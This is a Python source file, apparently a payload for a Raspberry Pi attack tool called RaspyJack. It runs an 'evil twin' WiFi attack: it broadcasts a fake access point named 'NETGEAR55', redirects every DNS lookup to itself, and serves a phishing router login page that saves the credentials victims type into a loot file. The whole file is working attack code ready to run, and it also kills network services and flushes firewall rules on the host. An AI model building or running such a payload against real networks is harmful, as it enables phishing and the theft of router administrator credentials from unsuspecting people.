#!/usr/bin/env python3
"""
RaspyJack *payload* – **SE: Evil Twin (Router Login)**
=======================================================
A social engineering payload that creates a fake WiFi network and serves
a generic router login page to capture administrative credentials.
"""

import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
WIFI_INTERFACE = "wlan1"
FAKE_AP_SSID = "NETGEAR55"
FAKE_AP_CHANNEL = "6"
CAPTIVE_PORTAL_PATH = "/root/Raspyjack/DNSSpoof/sites/phish_router/"
LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin_router/"

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

# --- Globals & Shutdown ---
running = True
attack_processes = {}
status_info = { "clients": 0, "credentials": 0 }

def cleanup(*_):
    global running
    if running:
        running = False
        for proc in attack_processes.values():
            try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except: pass
        attack_processes.clear()
        subprocess.run("iptables -F; iptables -t nat -F", shell=True)
        subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down; iwconfig {WIFI_INTERFACE} mode managed; ifconfig {WIFI_INTERFACE} up", shell=True)
        if os.path.exists(TEMP_CONF_DIR): subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI & Core Logic ---
def draw_ui(status: str):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Evil Twin (Router)", font=FONT_TITLE, fill="#005a9e")
    d.line([(0, 22), (128, 22)], fill="#005a9e", width=1)
    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 25), status, font=FONT_TITLE, fill=status_color)
    d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT, fill="white")
    d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT, fill="yellow")
    d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT, fill="orange")
    d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def start_attack():
    subprocess.run("pkill wpa_supplicant; pkill dnsmasq; pkill hostapd; pkill php", shell=True, capture_output=True)
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\\ndriver=nl80211\\nssid={FAKE_AP_SSID}\\nhw_mode=g\\nchannel={FAKE_AP_CHANNEL}\\n")
    dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
    with open(dnsmasq_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\\ndhcp-range=10.0.0.10,10.0.0.100,12h\\ndhcp-option=3,10.0.0.1\\ndhcp-option=6,10.0.0.1\\naddress=/#/10.0.0.1\\n")
    if os.path.exists(LOOT_FILE): os.remove(LOOT_FILE)
    subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True)
    attack_processes['hostapd'] = subprocess.Popen(f"hostapd {hostapd_conf_path}", shell=True, preexec_fn=os.setsid)
    time.sleep(2)
    attack_processes['dnsmasq'] = subprocess.Popen(f"dnsmasq -C {dnsmasq_conf_path} -d", shell=True, preexec_fn=os.setsid)
    time.sleep(2)
    attack_processes['php'] = subprocess.Popen(f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}", shell=True, preexec_fn=os.setsid)
    return True

def monitor_status():
    while running:
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f: status_info["clients"] = len(f.readlines())
        except: status_info["clients"] = 0
        try:
            with open(LOOT_FILE, "r") as f: status_info["credentials"] = len(f.read().split("----")) -1
        except: status_info["credentials"] = 0
        time.sleep(5)

# --- Main Loop ---
try:
    draw_ui("STARTING")
    if start_attack():
        threading.Thread(target=monitor_status, daemon=True).start()
        while running:
            draw_ui("ACTIVE")
            if GPIO.input(PINS["KEY3"]) == 0: cleanup()
            time.sleep(1)
    else:
        draw_ui("FAILED")
        time.sleep(3)
except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("SE Evil Twin (Router) payload finished.")
